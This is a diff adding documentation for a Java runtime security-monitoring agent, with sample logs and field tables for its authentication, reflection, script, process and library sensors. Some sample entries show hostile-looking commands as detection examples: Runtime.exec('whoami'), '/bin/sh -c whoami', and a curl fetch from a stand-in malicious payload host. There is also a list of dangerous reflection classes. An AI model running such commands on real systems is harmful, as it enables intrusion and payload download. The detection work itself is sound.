@@ -1381,6 +1381,373 @@ Environment variables containing sensitive information are automatically redacte
 
 ---
 
+### AUTH Events (Authentication Sensor)
+
+**Log File:** `agent-AUTH-events.log`
+**Namespace:** `org.jvmxray.events.auth.session`
+
+Monitors authentication operations including JAAS login, Spring Security authentication, session operations, and principal lookups.
+
+#### Sample Log Entries
+
+**JAAS Login:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.auth.session |
+auth_action=login|auth_mechanism=jaas|auth_success=true
+```
+
+**Spring Security Authentication (Success):**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | http-nio-8080-exec-3 | INFO | org.jvmxray.events.auth.session |
+auth_action=authenticate|auth_mechanism=spring_security|auth_success=true|principal_name=admin
+```
+
+**Spring Security Authentication (Failure):**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | http-nio-8080-exec-5 | INFO | org.jvmxray.events.auth.session |
+auth_action=authenticate|auth_mechanism=spring_security|auth_success=false|auth_failure_reason=BadCredentialsException
+```
+
+**Principal Lookup:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | http-nio-8080-exec-3 | INFO | org.jvmxray.events.auth.session |
+auth_action=get_principal|principal_name=admin
+```
+
+#### Field Reference
+
+| Field | Type | Description | Possible Values |
+|-------|------|-------------|-----------------|
+| `auth_action` | String | Type of authentication operation | `login` - JAAS login attempt<br>`authenticate` - Spring Security authentication<br>`get_principal` - Principal name lookup |
+| `auth_mechanism` | String | Authentication framework used | `jaas` - Java Authentication and Authorization Service<br>`spring_security` - Spring Security framework |
+| `auth_success` | Boolean | Whether authentication succeeded | `true`, `false` |
+| `auth_failure_reason` | String | Exception class on failure | Exception simple name (e.g., `BadCredentialsException`, `LoginException`) |
+| `principal_name` | String | Authenticated user identity | Username or principal name |
+
+---
+
+### APICALL Events (API Call Sensor)
+
+**Log File:** `agent-APICALL-events.log`
+**Namespace:** `org.jvmxray.events.api.call`
+
+Monitors Java 11+ HttpClient.send() operations, capturing request details, response status, and timing.
+
+#### Sample Log Entries
+
+**Successful API Call:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.api.call |
+operation=http_client_send|request_uri=https://api.example.com/v1/users|request_host=api.example.com|
+request_scheme=https|uses_tls=true|request_method=GET|response_time_ms=142|
+response_status=200|status_class=success|content_type=application/json|status=completed
+```
+
+**Failed API Call:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | pool-2-thread-1 | INFO | org.jvmxray.events.api.call |
+operation=http_client_send|request_uri=https://internal-service:8443/health|request_host=internal-service|
+request_scheme=https|uses_tls=true|request_method=GET|status=failed|
+error_class=ConnectException|error_message=Connection refused
+```
+
+#### Field Reference
+
+| Field | Type | Description | Possible Values |
+|-------|------|-------------|-----------------|
+| `operation` | String | Type of API operation | `http_client_send` - HttpClient.send() call |
+| `request_uri` | String | Full request URI | Any valid URI (e.g., `https://api.example.com/v1/users`) |
+| `request_host` | String | Target hostname | Hostname from the URI |
+| `request_scheme` | String | Protocol scheme | `http`, `https` |
+| `request_port` | Integer | Target port | Port number (e.g., `443`, `8080`) |
+| `request_method` | String | HTTP method | `GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `HEAD`, `OPTIONS` |
+| `uses_tls` | Boolean | Whether connection uses TLS | `true` for HTTPS, `false` for HTTP |
+| `response_time_ms` | Double | Response time in milliseconds | Execution duration (e.g., `142`) |
+| `response_status` | Integer | HTTP status code | `200`, `404`, `500`, etc. |
+| `status_class` | String | Response status classification | `success` - 2xx<br>`redirect` - 3xx<br>`client_error` - 4xx<br>`server_error` - 5xx |
+| `content_type` | String | Response Content-Type header | MIME type (e.g., `application/json`, `text/html`) |
+| `status` | String | Operation completion status | `completed` - Request finished normally<br>`failed` - Exception thrown |
+| `error_class` | String | Exception class on failure | Exception simple name (e.g., `ConnectException`, `SocketTimeoutException`) |
+| `error_message` | String | Error description | Exception message text |
+
+---
+
+### REFLECTION Events (Reflection Sensor)
+
+**Log File:** `agent-REFLECTION-events.log`
+**Namespaces:**
+- `org.jvmxray.events.reflection.class_forname` - Class.forName() operations
+- `org.jvmxray.events.reflection.method_invoke` - Method.invoke() operations
+- `org.jvmxray.events.reflection.constructor_invoke` - Constructor.newInstance() operations
+- `org.jvmxray.events.reflection.field_get` - Field.get() operations
+- `org.jvmxray.events.reflection.field_set` - Field.set() operations
+- `org.jvmxray.events.reflection.setAccessible` - setAccessible() calls
+
+Monitors reflective operations that can be used for code injection, privilege escalation, and access control bypass.
+
+#### Sample Log Entries
+
+**Class Loading (Suspicious):**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.reflection.class_forname |
+operation=class_forName|class_name=java.lang.ProcessBuilder|loaded_successfully=true|
+suspicious_class=true|risk_level=HIGH|threat_type=privilege_escalation|
+class_loader=sun.misc.Launcher$AppClassLoader
+```
+
+**Method Invocation:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.reflection.method_invoke |
+operation=method_invoke|method_name=exec|declaring_class=java.lang.Runtime|
+instance_provided=true|arg_count=1|command_execution=true|risk_level=CRITICAL
+```
+
+**Access Control Bypass:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | pool-1-thread-2 | INFO | org.jvmxray.events.reflection.setAccessible |
+operation=setAccessible|target_info=java.lang.reflect.Field|access_control_bypass=true|
+risk_level=HIGH
+```
+
+#### Field Reference
+
+| Field | Type | Description | Possible Values |
+|-------|------|-------------|-----------------|
+| `operation` | String | Type of reflective operation | `class_forName`, `method_invoke`, `constructor_newInstance`, `field_get`, `field_set`, `setAccessible` |
+| `class_name` | String | Class being loaded via reflection | Fully qualified class name |
+| `method_name` | String | Method being invoked | Method name |
+| `declaring_class` | String | Class that declares the method/field | Fully qualified class name |
+| `field_name` | String | Field being accessed or modified | Field name |
+| `suspicious_class` | Boolean | Whether class matches known dangerous patterns | `true` for classes like `ProcessBuilder`, `Runtime`, `TemplatesImpl` |
+| `suspicious_method` | Boolean | Whether method is potentially dangerous | `true` for methods like `exec`, `invoke` |
+| `risk_level` | String | Threat risk assessment | `MEDIUM`, `HIGH`, `CRITICAL` |
+| `threat_type` | String | Classification of potential threat | `privilege_escalation`, `code_injection` |
+| `access_control_bypass` | Boolean | Whether setAccessible(true) was called | `true` if bypassing access control |
+| `command_execution` | Boolean | Whether Runtime.exec was detected | `true` if executing system commands |
+| `bytecode_framework` | Boolean | Whether a bytecode framework class was detected | `true` for ASM, ByteBuddy, CGLib, Javassist classes |
+| `loaded_successfully` | Boolean | Whether Class.forName succeeded | `true`, `false` |
+| `class_loader` | String | ClassLoader used to load the class | Class loader name or `bootstrap` |
+| `instance_provided` | Boolean | Whether an object instance was passed to invoke | `true`, `false` |
+| `arg_count` | Integer | Number of arguments passed | Argument count |
+| `error` | String | Exception class on failure | Exception simple name |
+| `error_message` | String | Error description | Exception message text |
+
+---
+
+### SCRIPT Events (Script Engine Sensor)
+
+**Log File:** `agent-SCRIPT-events.log`
+**Namespace:** `org.jvmxray.events.script.execution`
+
+Monitors ScriptEngine.eval() operations and engine lookups, detecting suspicious script content and tracking execution.
+
+#### Sample Log Entries
+
+**Script Evaluation (Suspicious):**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.script.execution |
+operation=script_eval|engine_name=Oracle Nashorn|script_language=JavaScript|
+script_length=156|script_hash=a1b2c3d4e5f6a7b8|
+script_snippet=var r = java.lang.Runtime.getRuntime(); r.exec("whoami");|
+suspicious_patterns=Runtime.exec|risk_level=HIGH|status=success|duration_ms=23.5
+```
+
+**Script Evaluation (Normal):**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.script.execution |
+operation=script_eval|engine_name=GraalVM JavaScript|script_language=JavaScript|
+script_length=42|script_hash=f0e1d2c3b4a59687|risk_level=LOW|status=success|duration_ms=8.2
+```
+
+**Engine Lookup:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.script.execution |
+operation=engine_lookup|engine_lookup=javascript
+```
+
+#### Field Reference
+
+| Field | Type | Description | Possible Values |
+|-------|------|-------------|-----------------|
+| `operation` | String | Type of script operation | `script_eval` - Script execution<br>`engine_lookup` - Engine resolution by name/extension |
+| `engine_name` | String | Script engine implementation name | `Oracle Nashorn`, `GraalVM JavaScript`, etc. |
+| `script_language` | String | Scripting language | `JavaScript`, `Python`, `Groovy`, etc. |
+| `script_length` | Integer | Script content length in characters | Character count |
+| `script_hash` | String | SHA-256 hash prefix of script content | First 16 hex characters of hash |
+| `script_snippet` | String | Script content preview (truncated to 200 chars) | Beginning of script text |
+| `suspicious_patterns` | String | Detected dangerous patterns | Comma-separated list (e.g., `Runtime.exec,ProcessBuilder,Class.forName`) |
+| `risk_level` | String | Threat risk assessment | `LOW` - No suspicious patterns<br>`HIGH` - Suspicious patterns detected |
+| `script_source` | String | Input source type | `reader` if script provided via Reader |
+| `engine_lookup` | String | Engine name or extension being looked up | Engine identifier (e.g., `javascript`, `js`) |
+| `duration_ms` | Double | Execution time in milliseconds | Execution duration |
+| `status` | String | Execution result | `success`, `error` |
+| `error_class` | String | Exception class on failure | Exception simple name |
+| `error_message` | String | Error description | Exception message text |
+
+---
+
+### PROCESS Events (Process Sensor)
+
+**Log File:** `agent-SYSTEM-events.log`
+**Namespace:** `org.jvmxray.events.system.process`
+
+Monitors process execution via ProcessBuilder.start() and Runtime.exec(), capturing commands, arguments, and execution details.
+
+#### Sample Log Entries
+
+**Process Execution:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.system.process |
+operation=EXECUTE|command=/bin/sh|args=-c whoami|working_dir=/opt/app|
+execution_time_ms=45|status=started
+```
+
+**Process Execution Failure:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | pool-1-thread-1 | INFO | org.jvmxray.events.system.process |
+operation=EXECUTE|command=/usr/bin/curl|args=https://malicious-site.com/payload|
+status=failed|error_class=IOException|error_message=Cannot run program "/usr/bin/curl"
+```
+
+#### Field Reference
+
+| Field | Type | Description | Possible Values |
+|-------|------|-------------|-----------------|
+| `operation` | String | Type of process operation | `EXECUTE` - Process execution |
+| `command` | String | Executable path or name | Path to executable (e.g., `/bin/sh`, `cmd.exe`) |
+| `args` | String | Command-line arguments | Space-separated arguments |
+| `working_dir` | String | Process working directory (if specified) | Absolute directory path |
+| `execution_time_ms` | Long | Execution time in milliseconds | Duration value |
+| `status` | String | Process launch result | `started` - Process launched successfully<br>`failed` - Exception during launch |
+| `error_class` | String | Exception class on failure | Exception simple name (e.g., `IOException`) |
+| `error_message` | String | Error description | Exception message text |
+
+---
+
+### LIB Events (Library Sensor)
+
+**Log File:** `agent-SYSTEM-events.log`
+**Namespace:** `org.jvmxray.events.system.lib`
+
+Monitors JAR library loading on the classpath, capturing SHA-256 hashes, Maven coordinates, and package inventories for supply chain security.
+
+#### Sample Log Entries
+
+**Static Classpath JAR:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | jvmxray.libsensor-1 | INFO | org.jvmxray.events.system.lib |
+load_type=static|jar_path=/home/user/.m2/repository/org/springframework/spring-core/6.1.0/spring-core-6.1.0.jar|
+sha256=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2|
+groupId=org.springframework|artifactId=spring-core|version=6.1.0|
+implTitle=Spring Core|implVendor=Spring Framework|packages=org.springframework.core,org.springframework.util
+```
+
+**Dynamic JAR (No Maven Coordinates):**
+```
+C:AP | 2024.09.15 at 14:30:28 EDT | jvmxray.libsensor-1 | INFO | org.jvmxray.events.system.lib |
+load_type=dynamic|jar_path=/opt/app/plugins/custom-plugin.jar|
+sha256=f0e1d2c3b4a5968778695a4b3c2d1e0fa9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4|
+packages=com.example.plugin
+```
+
+#### Field Reference
+
+| Field | Type | Description | Possible Values |
+|-------|------|-------------|-----------------|
+| `load_type` | String | How the JAR was loaded | `static` - Present on initial classpath<br>`dynamic` - Loaded at runtime |
+| `jar_path` | String | Absolute path to the JAR file | File system path |
+| `sha256` | String | SHA-256 hash of the JAR file | 64 hex character hash |
+| `groupId` | String | Maven group ID (if available from META-INF) | Maven group (e.g., `org.springframework`) |
+| `artifactId` | String | Maven artifact ID (if available) | Maven artifact name |
+| `version` | String | Maven version (if available) | Version string (e.g., `6.1.0`) |
+| `implTitle` | String | Implementation-Title from MANIFEST.MF | JAR title |
+| `implVersion` | String | Implementation-Version from MANIFEST.MF | Version string |
+| `implVendor` | String | Implementation-Vendor from MANIFEST.MF | Vendor name |
+| `packages` | String | Java packages found in the JAR | Comma-separated package names |
+
+---
+
+### UNCAUGHTEXCEPTION Events (Uncaught Exception Sensor)
+
+**Log File:** `agent-SYSTEM-events.log`
+**Namespace:** `org.jvmxray.events.system.uncaughtexception`
+
+Captures crash diagnostics when threads terminate with uncaught exceptions, including stack traces, memory state, and incident identification.
+
+#### Sample Log Entry
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | pool-1-thread-3 | INFO | org.jvmxray.events.system.uncaughtexception |
+thread_name=pool-1-thread-3|thread_id=42|thread_state=RUNNABLE|thread_priority=5|
+thread_daemon=false|thread_group=main|exception_type=java.lang.NullPointerException|
+exception_message=Cannot invoke method on null reference|
+exception_location=com.example.service.OrderService:127|exception_method=processOrder|
+stack_depth=15|incident_id=c3a1b2d4-e5f6-7890-abcd-ef1234567890|
+root_cause_type=java.lang.NullPointerException|root_cause_message=Cannot invoke method on null reference|
+stack_trace=com.example.service.OrderService.processOrder(OrderService.java:127) > com.example.controller.OrderController.submit(OrderController.java:45)
+```
+
+#### Field Reference
+
+| Field | Type | Description | Possible Values |
+|-------|------|-------------|-----------------|
+| `thread_name` | String | Name of thread where exception occurred | Thread name (e.g., `main`, `pool-1-thread-3`) |
+| `thread_id` | Long | Thread ID | Numeric thread identifier |
+| `thread_state` | String | Thread state at time of exception | `RUNNABLE`, `WAITING`, `TIMED_WAITING`, `BLOCKED` |
+| `thread_priority` | Integer | Thread priority | `1`-`10` (default `5`) |
+| `thread_daemon` | Boolean | Whether thread is a daemon thread | `true`, `false` |
+| `thread_group` | String | Thread group name | Thread group (e.g., `main`, `system`) |
+| `exception_type` | String | Fully qualified exception class | Exception class name (e.g., `java.lang.NullPointerException`) |
+| `exception_message` | String | Exception message | Exception detail text |
+| `exception_location` | String | First non-JDK stack frame | `ClassName:lineNumber` format |
+| `exception_method` | String | Method where exception occurred | Method name |
+| `stack_depth` | Integer | Total stack trace depth | Number of frames |
+| `stack_trace` | String | Simplified stack trace | First 10 frames (INFO) or all frames (DEBUG), separated by ` > ` |
+| `root_cause_type` | String | Root cause exception class (if chained) | Exception class name |
+| `root_cause_message` | String | Root cause message | Exception detail text |
+| `incident_id` | String | Unique incident identifier | UUID string |
+| `timestamp` | Long | Time of exception (epoch milliseconds) | Milliseconds since epoch |
+| `jvm_uptime_ms` | Long | JVM uptime at time of exception | Uptime in milliseconds |
+
+---
+
+### APPINIT Events (App Init Sensor)
+
+**Log File:** `agent-SYSTEM-events.log`
+**Namespace:** `org.jvmxray.events.system.settings`
+
+One-time startup capture of JVM version, OS details, container detection, environment variables (with sensitive value redaction), and system properties.
+
+#### Sample Log Entries
+
+**System Context:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.system.settings |
+event_type=system_context|jvm_version=17.0.8|jvm_vendor=Eclipse Adoptium|
+os_name=Linux|os_arch=amd64|is_container=true|container_type=docker
+```
+
+**Environment Variable:**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.system.settings |
+message=JAVA_HOME=/usr/lib/jvm/java-17-openjdk
+```
+
+**Sensitive Variable (Redacted):**
+```
+C:AP | 2024.09.15 at 14:30:25 EDT | main | INFO | org.jvmxray.events.system.settings |
+message=DB_PASSWORD=***REDACTED***|is_redacted=true
+```
+
+#### Field Reference
+
+| Field | Type | Description | Possible Values |
+|-------|------|-------------|-----------------|
+| `event_type` | String | Type of initialization event | `system_context` - JVM and environment snapshot |
+| `message` | String | Individual environment variable or system property | `KEY=VALUE` format (e.g., `JAVA_HOME=/usr/lib/jvm/java-17-openjdk`) |
+| `is_redacted` | Boolean | Whether the value was redacted for security | `true` for variables containing PASSWORD, SECRET, TOKEN, API_KEY, PRIVATE_KEY, CREDENTIAL |
+
+---
+
 ### Risk Level Classification
 
 All sensors use a consistent risk level classification:
